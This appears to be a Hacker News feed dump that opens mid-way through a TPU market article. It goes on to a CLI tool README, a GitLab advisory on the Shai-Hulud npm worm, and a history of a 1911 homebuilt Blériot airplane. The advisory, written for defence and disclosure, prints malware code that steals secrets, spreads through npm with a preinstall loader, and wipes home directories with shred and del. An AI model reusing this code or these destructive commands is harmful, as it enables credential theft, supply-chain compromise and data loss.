    &lt;p&gt;Even for hard Nvidia advocates, TPUs are not to be shrugged off easily, as even Jensen thinks very highly of Google’s TPUs. In a podcast with Brad Gerstner, he mentioned that when it comes to ASICs, Google with TPUs is a »special case«. A few months ago, we also got an article from the WSJ saying that after the news publication The Information published a report that stated that OpenAI had begun renting Google TPUs for ChatGPT, Jensen called Altman, asking him if it was true, and signaled that he was open to getting the talks back on track (investment talks). Also worth noting was that Nvidia’s official X account posted a screenshot of an article in which OpenAI denied plans to use Google’s in-house chips. To say the least, Nvidia is watching TPUs very closely.&lt;/p&gt;
    &lt;p&gt;Ok, but after looking at some of these numbers, one might think, why aren’t more clients using TPUs?&lt;/p&gt;
    &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
    &lt;p&gt;The main problem for TPUs adoption is the ecosystem. Nvidia’s CUDA is engraved in the minds of most AI engineers, as they have been learning CUDA in universities. Google has developed its ecosystem internally but not externally, as it has used TPUs only for its internal workloads until now. TPUs use a combination of JAX and TensorFlow, while the industry skews to CUDA and PyTorch (although TPUs also support PyTorch now). While Google is working hard to make its ecosystem more supportive and convertible with other stacks, it is also a matter of libraries and ecosystem formation that takes years to develop.&lt;/p&gt;
    &lt;p&gt;It is also important to note that, until recently, the GenAI industry’s focus has largely been on training workloads. In training workloads, CUDA is very important, but when it comes to inference, even reasoning inference, CUDA is not that important, so the chances of expanding the TPU footprint in inference are much higher than those in training (although TPUs do really well in training as well – Gemini 3 the prime example).&lt;/p&gt;
    &lt;p&gt;The fact that most clients are multi-cloud also poses a challenge for TPU adoption, as AI workloads are closely tied to data and its location (cloud data transfer is costly). Nvidia is accessible via all three hyperscalers, while TPUs are available only at GCP so far. A client who uses TPUs and Nvidia GPUs explains it well:&lt;/p&gt;
    &lt;p&gt;»Right now, the one biggest advantage of NVIDIA, and this has been true for past three companies I worked on is because AWS, Google Cloud and Microsoft Azure, these are the three major cloud companies.&lt;/p&gt;
    &lt;p&gt;Every company, every corporate, every customer we have will have data in one of these three. All these three clouds have NVIDIA GPUs. Sometimes the data is so big and in a different cloud that it is a lot cheaper to run our workload in whatever cloud the customer has data in.&lt;/p&gt;
    &lt;p&gt;I don’t know if you know about the egress cost that is moving data out of one cloud is one of the bigger cost. In that case, if you have NVIDIA workload, if you have a CUDA workload, we can just go to Microsoft Azure, get a VM that has NVIDIA GPU, same GPU in fact, no code change is required and just run it there.&lt;/p&gt;
    &lt;p&gt;With TPUs, once you are all relied on TPU and Google says, “You know what? Now you have to pay 10X more,” then we would be screwed, because then we’ll have to go back and rewrite everything. That’s why. That’s the only reason people are afraid of committing too much on TPUs. The same reason is for Amazon’s Trainium and Inferentia.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;These problems are well known at Google, so it is no surprise that internally, the debate over keeping TPUs inside Google or starting to sell them externally is a constant topic. When keeping them internally, it enhances the GCP moat, but at the same time, many former Google employees believe that at some point, Google will start offering TPUs externally as well, maybe through some neoclouds, not necessarily with the biggest two competitors, Microsoft and Amazon. Opening up the ecosystem, providing support, etc., and making it more widely usable are the first steps toward making that possible.&lt;/p&gt;
    &lt;p&gt;A former Google employee also mentioned that Google last year formed a more sales-oriented team to push and sell TPUs, so it’s not like they have been pushing hard to sell TPUs for years; it is a fairly new dynamic in the organization.&lt;/p&gt;
    &lt;p&gt;Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
    &lt;p&gt;The most valuable thing for me about TPUs is their impact on GCP. As we witness the transformation of cloud businesses from the pre-AI era to the AI era, the biggest takeaway is that the industry has gone from an oligopoly of AWS, Azure, and GCP to a more commoditized landscape, with Oracle, Coreweave, and many other neoclouds competing for AI workloads. The problem with AI workloads is the competition and Nvidia’s 75% gross margin, which also results in low margins for AI workloads. The cloud industry is moving from a 50-70% gross margin industry to a 20-35% gross margin industry. For cloud investors, this should be concerning, as the future profile of some of these companies is more like that of a utility than an attractive, high-margin business. But there is a solution to avoiding that future and returning to a normal margin: the ASIC.&lt;/p&gt;
    &lt;p&gt;The cloud providers who can control the hardware and are not beholden to Nvidia and its 75% gross margin will be able to return to the world of 50% gross margins. And there is no surprise that all three AWS, Azure, and GCP are developing their own ASICs. The most mature by far is Google’s TPU, followed by Amazon’s Trainum, and lastly Microsoft’s MAIA (although Microsoft owns the full IP of OpenAI’s custom ASICs, which could help them in the future).&lt;/p&gt;
    &lt;p&gt;While even with ASICs you are not 100% independent, as you still have to work with someone like Broadcom or Marvell, whose margins are lower than Nvidia’s but still not negligible, Google is again in a very good position. Over the years of developing TPUs, Google has managed to control much of the chip design process in-house. According to a current AMD employee, Broadcom no longer knows everything about the chip. At this point, Google is the front-end designer (the actual RTL of the design) while Broadcom is only the backend physical design partner. Google, on top of that, also, of course, owns the entire software optimization stack for the chip, which makes it as performant as it is. According to the AMD employee, based on this work split, he thinks Broadcom is lucky if it gets a 50-point gross margin on its part.&lt;/p&gt;
    &lt;p&gt;Without having to pay Nvidia for the accelerator, a cloud provider can either price its compute similarly to others and maintain a better margin profile or lower costs and gain market share. Of course, all of this depends on having a very capable ASIC that can compete with Nvidia. Unfortunately, it looks like Google is the only one that has achieved that, as the number one-performing model is Gemini 3 trained on TPUs. According to some former Google employees, internally, Google is also using TPUs for inference across its entire AI stack, including Gemini and models like Veo. Google buys Nvidia GPUs for GCP, as clients want them because they are familiar with them and the ecosystem, but internally, Google is full-on with TPUs.&lt;/p&gt;
    &lt;p&gt;As the complexity of each generation of ASICs increases, similar to the complexity and pace of Nvidia, I predict that not all ASIC programs will make it. I believe outside of TPUs, the only real hyperscaler shot right now is AWS Trainium, but even that faces much bigger uncertainties than the TPU. With that in mind, Google and its cloud business can come out of this AI era as a major beneficiary and market-share gainer.&lt;/p&gt;
    &lt;p&gt;Recently, we even got comments from the SemiAnalysis team praising the TPU:&lt;/p&gt;
    &lt;p&gt;»Google’s silicon supremacy among hyperscalers is unmatched, with their TPU 7th Gen arguably on par with Nvidia Blackwell. TPU powers the Gemini family of models which are improving in capability and sit close to the pareto frontier of $ per intelligence in some tasks«&lt;/p&gt;
    &lt;p&gt;source: SemiAnalysis&lt;/p&gt;
    &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
    &lt;p&gt;Here are the numbers that I researched:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.uncoveralpha.com/p/the-chip-made-for-the-ai-inference"/><published>2025-11-27T13:28:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46069556</id><title>Show HN: Runprompt – run .prompt files from the command line</title><updated>2025-11-27T22:10:00.421102+00:00</updated><content>&lt;doc fingerprint="1c7ffd5c6cb14e40"&gt;
  &lt;main&gt;
    &lt;p&gt;A single-file Python script for running .prompt files.&lt;/p&gt;
    &lt;p&gt;Quick start | Examples | Configuration | Providers&lt;/p&gt;
    &lt;code&gt;curl -O https://raw.githubusercontent.com/chr15m/runprompt/main/runprompt
chmod +x runprompt&lt;/code&gt;
    &lt;p&gt;Create &lt;code&gt;hello.prompt&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;Run it:&lt;/p&gt;
    &lt;code&gt;export ANTHROPIC_API_KEY="your-key"
echo '{"name": "World"}' | ./runprompt hello.prompt&lt;/code&gt;
    &lt;p&gt;In addition to the following, see the tests folder for more example &lt;code&gt;.prompt&lt;/code&gt; files.&lt;/p&gt;
    &lt;code&gt;cat article.txt | ./runprompt summarize.prompt&lt;/code&gt;
    &lt;p&gt;The special &lt;code&gt;{{STDIN}}&lt;/code&gt; variable always contains the raw stdin as a string.&lt;/p&gt;
    &lt;p&gt;Extract structured data using an output schema:&lt;/p&gt;
    &lt;code&gt;echo "John is a 30 year old teacher" | ./runprompt extract.prompt
# {"name": "John", "age": 30, "occupation": "teacher"}&lt;/code&gt;
    &lt;p&gt;Fields ending with &lt;code&gt;?&lt;/code&gt; are optional. The format is &lt;code&gt;field: type, description&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Pipe structured output between prompts:&lt;/p&gt;
    &lt;code&gt;echo "John is 30" | ./runprompt extract.prompt | ./runprompt generate-bio.prompt&lt;/code&gt;
    &lt;p&gt;The JSON output from the first prompt becomes template variables in the second.&lt;/p&gt;
    &lt;p&gt;Override any frontmatter value from the command line:&lt;/p&gt;
    &lt;code&gt;./runprompt --model anthropic/claude-haiku-4-20250514 hello.prompt
./runprompt --name "Alice" hello.prompt&lt;/code&gt;
    &lt;p&gt;Set API keys for your providers:&lt;/p&gt;
    &lt;code&gt;export ANTHROPIC_API_KEY="..."
export OPENAI_API_KEY="..."
export GOOGLE_API_KEY="..."
export OPENROUTER_API_KEY="..."&lt;/code&gt;
    &lt;p&gt;Override any frontmatter value via environment variables prefixed with &lt;code&gt;RUNPROMPT_&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;export RUNPROMPT_MODEL="anthropic/claude-haiku-4-20250514"
./runprompt hello.prompt&lt;/code&gt;
    &lt;p&gt;This is useful for setting defaults across multiple prompt runs.&lt;/p&gt;
    &lt;p&gt;Use &lt;code&gt;-v&lt;/code&gt; to see request/response details:&lt;/p&gt;
    &lt;code&gt;./runprompt -v hello.prompt&lt;/code&gt;
    &lt;p&gt;Models are specified as &lt;code&gt;provider/model-name&lt;/code&gt;:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Provider&lt;/cell&gt;
        &lt;cell role="head"&gt;Model format&lt;/cell&gt;
        &lt;cell role="head"&gt;API key env var&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Anthropic&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;anthropic/claude-sonnet-4-20250514&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;ANTHROPIC_API_KEY&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;OpenAI&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;openai/gpt-4o&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;OPENAI_API_KEY&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Google AI&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;googleai/gemini-1.5-pro&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;GOOGLE_API_KEY&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;OpenRouter&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;openrouter/anthropic/claude-sonnet-4-20250514&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;OPENROUTER_API_KEY&lt;/code&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;OpenRouter provides access to models from many providers (Anthropic, Google, Meta, etc.) through a single API key.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/chr15m/runprompt"/><published>2025-11-27T14:26:35+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070203</id><title>GitLab discovers widespread NPM supply chain attack</title><updated>2025-11-27T22:10:00.286212+00:00</updated><content>&lt;doc fingerprint="850426190c2b864a"&gt;
  &lt;main&gt;&lt;p&gt;Published on: November 24, 2025&lt;/p&gt;&lt;p&gt;9 min read&lt;/p&gt;&lt;p&gt;Malware driving attack includes "dead man's switch" that can harm user data.&lt;/p&gt;&lt;p&gt;GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "Shai-Hulud" malware.&lt;/p&gt;&lt;p&gt;Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "dead man's switch" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.&lt;/p&gt;&lt;p&gt;We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.&lt;/p&gt;&lt;p&gt;Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:&lt;/p&gt;&lt;p&gt;While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.&lt;/p&gt;&lt;p&gt;The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified &lt;code&gt;package.json&lt;/code&gt; with a preinstall script pointing to &lt;code&gt;setup_bun.js&lt;/code&gt;. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.&lt;/p&gt;&lt;code&gt;// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
&lt;/code&gt;&lt;p&gt;The &lt;code&gt;setup_bun.js&lt;/code&gt; loader downloads or locates the Bun runtime on the system, then executes the bundled &lt;code&gt;bun_environment.js&lt;/code&gt; payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.&lt;/p&gt;&lt;p&gt;Once executed, the malware immediately begins credential discovery across multiple sources:&lt;/p&gt;&lt;code&gt;ghp_&lt;/code&gt; (GitHub personal access token) or &lt;code&gt;gho_&lt;/code&gt;(GitHub OAuth token)&lt;code&gt;.npmrc&lt;/code&gt; files and environment variables, which are common locations for securely storing sensitive configuration and credentials.&lt;code&gt;async function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
&lt;/code&gt;
&lt;p&gt;The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.&lt;/p&gt;&lt;code&gt;async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,
    auto_init: false,
    has_discussions: true
  });
  
  // Install GitHub Actions runner for persistence
  if (await this.checkWorkflowScope()) {
    let token = await this.octokit.request(
      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
&lt;/code&gt;
&lt;p&gt;Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.&lt;/p&gt;&lt;code&gt;// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token &amp;amp;&amp;amp; await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
&lt;/code&gt;
&lt;p&gt;Using stolen npm tokens, the malware:&lt;/p&gt;&lt;code&gt;setup_bun.js&lt;/code&gt; loader into each package's preinstall scripts&lt;code&gt;bun_environment.js&lt;/code&gt; payload&lt;code&gt;async function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
&lt;/code&gt;
&lt;p&gt;Our analysis uncovered a destructive payload designed to protect the malwareâs infrastructure against takedown attempts.&lt;/p&gt;&lt;p&gt;The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses &lt;code&gt;shred&lt;/code&gt; to overwrite files before deletion, making recovery nearly impossible.&lt;/p&gt;&lt;code&gt;// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" &amp;amp;&amp;amp; " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" &amp;amp; " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 &amp;amp;&amp;amp; " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
&lt;/code&gt;
&lt;p&gt;This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the userâs data when a takedown is detected.&lt;/p&gt;&lt;p&gt;To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.&lt;/p&gt;&lt;table&gt;&lt;row span="3"&gt;&lt;cell role="head"&gt;Type&lt;/cell&gt;&lt;cell role="head"&gt;Indicator&lt;/cell&gt;&lt;cell role="head"&gt;Description&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;bun_environment.js&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Malicious post-install script in node_modules directories&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Hidden directory created in user home for Trufflehog binary storage&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/extract/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Temporary directory used for binary extraction&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Linux/Mac)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog.exe&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Windows)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;del /F /Q /S "%USERPROFILE%*"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;shred -uvz -n 1&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Linux/Mac destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;cipher /W:%USERPROFILE%&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows secure deletion command in payload&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;curl -fsSL https://bun.sh/install | bash&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Suspicious Bun installation during NPM package install&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;powershell -c "irm bun.sh/install.ps1|iex"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows Bun installation via PowerShell&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt;If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.&lt;/p&gt;&lt;p&gt;First, enable Dependency Scanning to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your &lt;code&gt;package-lock.json&lt;/code&gt; or &lt;code&gt;yarn.lock&lt;/code&gt; files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation.&lt;/p&gt;&lt;p&gt;Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.&lt;/p&gt;&lt;p&gt;Next, GitLab Duo Chat can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like:&lt;/p&gt;&lt;p&gt;The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.&lt;/p&gt;&lt;p&gt;For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.&lt;/p&gt;&lt;p&gt;This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.&lt;/p&gt;&lt;p&gt;GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/"/><published>2025-11-27T15:36:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070668</id><title>Same-day upstream Linux support for Snapdragon 8 Elite Gen 5</title><updated>2025-11-27T22:10:00.101641+00:00</updated><content>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.qualcomm.com/developer/blog/2025/10/same-day-snapdragon-8-elite-gen-5-upstream-linux-support"/><published>2025-11-27T16:19:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070868</id><title>The VanDersarl Blériot: a 1911 airplane homebuilt by teenage brothers</title><updated>2025-11-27T22:09:59.918558+00:00</updated><content>&lt;doc fingerprint="3e50c640e82cc578"&gt;
  &lt;main&gt;
    &lt;p&gt;Fabricated by teenage brothers in 1911, this unique homebuilt is once again airworthy.&lt;/p&gt;
    &lt;p&gt;Despite its shortcomings, the Blériot XI was one of the great designs of aviation’s early years. The successful fruit of numerous prior attempts—and failures—by French pioneer aviator Louis Blériot, it was tricky and even dangerous to fly, largely because its horizontal stabilizer had an airfoil like the wing, which could cause the nose to suddenly pitch down during high-speed dives. When Blériot piloted the shoulder-winged monoplane on a historic 23½-mile hop across the English Channel in July 1909, however, he won his design a worldwide stamp of approval beyond its inherent merits. From then on, aviators out to score more firsts in distance, speed, altitude or endurance, or simply out to experience the thrill of early flight for its own sake, wanted a Blériot XI. Besides the examples Blériot produced, a number of other companies on either side of the Atlantic manufactured it under license, while other budding fliers built their own planes based on its basic layout. It was in that last category that the VanDersarl brothers staked their modest claim to fame.&lt;/p&gt;
    &lt;p&gt;Little is now known about Jules “J.J.” VanDersarl and his younger brother, Frank, except that they lived just outside Denver, Colo.; their mother worked as a housekeeper; and they barely made it through grade school. But both brothers proved to have innate mechanical talents that made them proficient at machining, carpentry and other skills. Given that, it’s not surprising these young men, like a good many others at the time, became enthralled with aviation. J.J. experimented with gliders at age 12, and later, a few months after Blériot’s 1909 Channel flight, he and Frank got more ambitious. Obtaining all the publications and photographs they could, they used those references to build their own Blériot XI in 1911…then learned to fly it.&lt;/p&gt;
    &lt;p&gt;According to Javier Arango, director of The Aeroplane Collection in Paso Robles, Calif., who now owns the VanDersarl Blériot, the brothers “must have had some guidance and lots of information,” because the dimensions of their airplane are close to those of the original. Their homebuilt differs from the standard Blériot XI in three respects, however. First and foremost, instead of the 25-hp Anzani 3-cylinder radial or Gnome rotary engine that normally powered Blériots, the VanDersarls, using their general knowledge and machining skills, adapted a 4-cylinder inline air-cooled automobile engine with a reworked oil system to aerial use. Just what that engine was remains uncertain, though Arango said it was “close in dimensions” to the power plant used in the Metz, a car equipped with a liquid-cooled engine that the company had planned to adapt to aviation but which never quite materialized.&lt;/p&gt;
    &lt;p&gt;A second difference, Arango noted, was that “some of the structure around the empennage is placed slightly differently than in most Blériots.” Finally, he said, “The French Blériots were built to a high quality, but our plane was built by teen agers in Colorado who just wanted to go fly—it’s a little rougher than pristine Blériots.”&lt;/p&gt;
    &lt;p&gt;Even so, the handmade airplane worked remarkably well. “There is a photo of the first flight, which ended up in a landing that broke the landing gear,” Arango reported. “But it was repaired and flew again. Both brothers flew it.”&lt;/p&gt;
    &lt;p&gt;The VanDersarls went on to fly Curtiss JN-4 Jennys and Standards, and in the 1920s, Arango said, “Frank started an airport and barnstorming operation.” The most remarkable thing, though, is that Frank kept the homebuilt in which he and J.J. had first learned how to fly. “I’m so glad they kept it,” Arango remarked. “This breed of airplane is quite rare. The Smithsonian Institution has only one such aircraft.”&lt;/p&gt;
    &lt;p&gt;In the 1960s Frank VanDersarl tried to restore the Blériot, but he died before completing the project. After J.J. VanDersarl died in Raton, N.M., in November 1977, the monoplane was exhibited at the Museum of New Mexico. In 1994 it was bought by Joseph Gertler, who loaned it to Dowling College in Bayport, N.Y. There it was further restored by John Zale, Frankie Mineo, Russ Moore and the Bayport Aerodrome Society. Then in 2009 Arango’s C.C. Air Corporation purchased it and added it to The Aeroplane Collection, with the ultimate goal of making it airworthy for the first time in a century.&lt;/p&gt;
    &lt;p&gt;“When we got it the plane was minimally restored,” Arango explained. “It was extremely authentic.” That meant it served as a useful reference toward the inevitable replacement of deteriorated material and components. “Chuck Wentworth from Antique Aero, who is really the main character in the restoration project, inspected it and went through everything,” he said. “The entire fuselage was in good shape. There were busted wires and turnbuckles that had to be reproduced and replaced to get it back to original condition. Chuck had to find parts of 1911 vintage to get the correct look, based on plans and photos. For example, they’d stuck a fake control wheel in the cockpit for display. We took all of that out.&lt;/p&gt;
    &lt;p&gt;“The wings were difficult—they were not the same age as the fuselage. They were probably damaged and were repaired or rebuilt by the VanDersarls. It took a lot of work with the wings to make them airworthy. The cotton covering was difficult to work with, and we even had to find the ‘honey-colored coating’ the VanDersarls described. We used a varnish that was tinted to get the correct honey color.”&lt;/p&gt;
    &lt;p&gt;Though he considered obtaining an Anzani engine, Arango decided to heed the advice of the National Air and Space Museum and “keep it as it was” by reconstructing the original engine. Fortunately for the restoration team, the VanDersarls “left good data on the cylinders, the copper cooling fins—all the specifications we needed to build the engine from scratch. The engine was put together with help from period publications and photos of the original.” The most difficult part was getting period components, but they managed to obtain a 1905 Bosch magneto, a brass carburetor of 1909 vintage, a tachometer, a magneto switch and a 1910 automobile oil gauge. In 2011 Wentworth unveiled the Blériot at the National Aviation Heritage Invitational in Reno, Nev. There on September 18 it won the event’s top award, the RollsRoyce Aviation Heritage Trophy.&lt;/p&gt;
    &lt;p&gt;Once the four-year project was completed, Arango and his team went through a systematic process toward getting it approved for flight by the Federal Aviation Administration. This presented some challenges, Arango said, since the Blériot XI predated the Civil Aeronautics Administration, let alone the FAA, and “there is no certificate and no paperwork of the age to make it current.” After the FAA inspected the aircraft, however, it finally registered the VanDersarl Blériot as an experimental airplane on August 16, 2012. This meant it could be flown under certain restrictions, such as not carrying a passenger for hire and with limits on the number of flights and travel radius around the airfield. “That was fine by us,” said Arango, “because we were happy to just fly, more or less in a straight line.”&lt;/p&gt;
